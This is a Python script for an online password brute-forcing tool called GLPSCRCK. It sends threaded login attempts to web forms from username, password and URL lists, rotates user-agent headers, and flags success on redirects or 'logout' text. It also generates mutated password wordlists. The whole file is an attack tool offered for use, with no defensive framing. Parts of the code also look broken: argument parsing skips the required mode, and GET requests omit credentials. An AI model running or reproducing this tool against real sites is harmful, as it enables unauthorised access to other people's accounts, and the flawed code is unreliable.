import argparse
import random
import time
import itertools
import requests
import logging
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from colorama import Fore, Style
import sys

def display_banner():
    banner = f"""
{Fore.CYAN}
  ██████╗ ██╗      ███████╗███████╗ ██████╗██████╗  ██████╗  ██████╗██╗  ██╗
  ██╔══██╗██║      ██╔════╝██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔════╝██║  ██║
  ██████╔╝██║█████╗█████╗  ███████╗██║     ██████╔╝██║   ██║██║     ███████║
  ██╔═══╝ ██║╚════╝██╔══╝  ╚════██║██║     ██╔══██╗██║   ██║██║     ██╔══██║
  ██║     ██║      ███████╗███████║╚██████╗██║  ██║╚██████╔╝╚██████╗██║  ██║
  ╚═╝     ╚═╝      ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
{Style.RESET_ALL}  A Powerful Password Cracker Tool - 2025 Edition
"""
    print(banner)

def setup_logging(level=logging.INFO, log_file="glpscrck.log"):
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s', filename=log_file, filemode='w')

def load_wordlist(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except IOError:
        logging.error(f"Unable to read file: {file_path}")
        return []

def get_default_headers():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
    ]
    return {'User-Agent': random.choice(user_agents)}

def test_credentials(target, username, password, username_param, password_param, method, timeout):
    headers = get_default_headers()
    data = {username_param: username, password_param: password}

    try:
        response = requests.post(target, data=data, headers=headers, timeout=timeout, allow_redirects=False) if method == 'POST' else requests.get(target, headers=headers, timeout=timeout, allow_redirects=False)

        if response.status_code in [301, 302]:  
            logging.info(f"Success (Redirect): {username}:{password} -> {response.headers.get('Location')}")
            print(f"{Fore.GREEN}[SUCCESS] {username}:{password} -> Redirected to {response.headers.get('Location')}{Style.RESET_ALL}")
            return {'username': username, 'password': password}

        if response.status_code == 200 and "logout" in response.text.lower():
            logging.info(f"Success: {username}:{password}")
            print(f"{Fore.GREEN}[SUCCESS] {username}:{password} (Login page returned valid response){Style.RESET_ALL}")
            return {'username': username, 'password': password}

        logging.debug(f"Failed: {username}:{password} (Status: {response.status_code})")
        return None

    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None

def run_brute_force(usernames, passwords, urls, username_param, password_param, method, timeout, delay):
    total_attempts = len(usernames) * len(passwords) * len(urls)

    with tqdm(total=total_attempts, desc="Brute Force Progress", unit="attempt") as pbar:
        with ThreadPoolExecutor(max_workers=10) as executor:
            for username, password, url in itertools.product(usernames, passwords, urls):
                executor.submit(test_credentials, target=url, username=username, password=password,
                                username_param=username_param, password_param=password_param,
                                method=method, timeout=timeout)
                pbar.update(1)
                time.sleep(delay)

def generate_password_list(words, output_file):
    base_passwords = words + [word.capitalize() for word in words] + [word.upper() for word in words]
    special_chars = ["!", "@", "#", "$", "%", "&", "*"]
    numbers = ["123", "2025", "000", "999", "111"]

    passwords = set(base_passwords)

    for word in base_passwords:
        for special in special_chars:
            passwords.add(word + special)
            passwords.add(special + word)
        for num in numbers:
            passwords.add(word + num)
            passwords.add(num + word)

    with open(output_file, "w", encoding="utf-8") as f:
        with tqdm(total=len(passwords), desc="Generating Wordlist", unit="password") as pbar:
            for password in passwords:
                f.write(password + "\n")
                pbar.update(1)

    print(f"{Fore.GREEN}Passwords saved to {output_file}{Style.RESET_ALL}")

def parse_args():
    if len(sys.argv) < 2:
        print(f"{Fore.RED}Error: You must specify 'attack' or 'generate' as the first argument.{Style.RESET_ALL}")
        sys.exit(1)

    mode = sys.argv[1].lower()
    if mode not in ['attack', 'generate']:
        print(f"{Fore.RED}Error: Unknown mode '{mode}'. Use 'attack' or 'generate'.{Style.RESET_ALL}")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="GLPSCRCK - A Powerful Password Cracker Tool")
    
    parser.add_argument('mode', help='Mode: attack or generate', type=str, choices=['attack', 'generate'])
    parser.add_argument('-U', '--userlist', help='Path to wordlist of usernames', type=str)
    parser.add_argument('-u', '--username', help='Single username', type=str)
    parser.add_argument('-P', '--passlist', help='Path to wordlist of passwords', type=str)
    parser.add_argument('-p', '--password', help='Single password', type=str)
    parser.add_argument('-L', '--urllist', help='Path to wordlist of URLs', type=str)
    parser.add_argument('-l', '--url', help='Single URL', type=str)
    parser.add_argument('-m', '--method', help='Request method (POST/GET)', type=str, default='POST')
    parser.add_argument('-t', '--timeout', help='Timeout for requests', type=int, default=10)
    parser.add_argument('-d', '--delay', help='Delay between requests in seconds', type=int, default=1)
    parser.add_argument('-W', '--words', help='Comma-separated words to generate passwords', type=str)
    parser.add_argument('-o', '--output', help='Output file for generated passwords', type=str, default="generated_passwords.txt")

    args = parser.parse_args(sys.argv[2:])
    return args

def main():
    display_banner()  
    args = parse_args()
    setup_logging()

    if args.mode == "attack":
        usernames = load_wordlist(args.userlist) if args.userlist else [args.username]
        passwords = load_wordlist(args.passlist) if args.passlist else [args.password]
        urls = load_wordlist(args.urllist) if args.urllist else [args.url]
        run_brute_force(usernames, passwords, urls, 'username', 'password', args.method, args.timeout, args.delay)

    elif args.mode == "generate":
        words = args.words.split(",") if args.words else []
        generate_password_list(words, args.output)

if __name__ == '__main__':
    main()
